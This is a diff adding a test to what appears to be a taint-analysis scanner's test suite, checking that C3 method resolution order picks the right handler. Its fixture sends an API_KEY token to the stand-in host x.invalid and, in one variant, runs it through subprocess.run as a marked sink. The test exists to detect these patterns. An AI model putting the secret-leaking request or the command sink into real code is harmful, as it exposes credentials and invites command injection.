@@ -2557,7 +2557,26 @@ class TestMethods:
 
     def test_c3_keeps_local_precedence_and_every_base(self) -> None:
         """``class C(B1, B2, B3)`` with ``B1(B3)`` resolves ``B2`` before
-        ``B3``, and a base past the 8th still constrains the order."""
+        ``B3``, ``class D(Base, Mixin)`` with ``Base(Root)`` resolves ``Root``
+        before ``Mixin``, and a base past the 8th still constrains the order."""
+        mixin = """
+            import os, requests, subprocess
+            class Root:
+                def handle(self, value):
+                    {root}
+            class Base(Root):
+                pass
+            class Mixin:
+                def handle(self, value):
+                    requests.post("https://x.invalid", data=value)
+            class D(Base, Mixin):
+                def go(self):
+                    token = os.getenv("API_KEY")
+                    self.handle(token)
+            """
+        first_base_ancestor = _code(mixin.format(root="subprocess.run(value)  # SINK"))
+        assert _summary(first_base_ancestor) == [("TT2", _line(first_base_ancestor, "# SINK"))]
+        assert _run(_code(mixin.format(root="return len(value)"))) == []
         local = _code(
             """
             import os, requests, subprocess
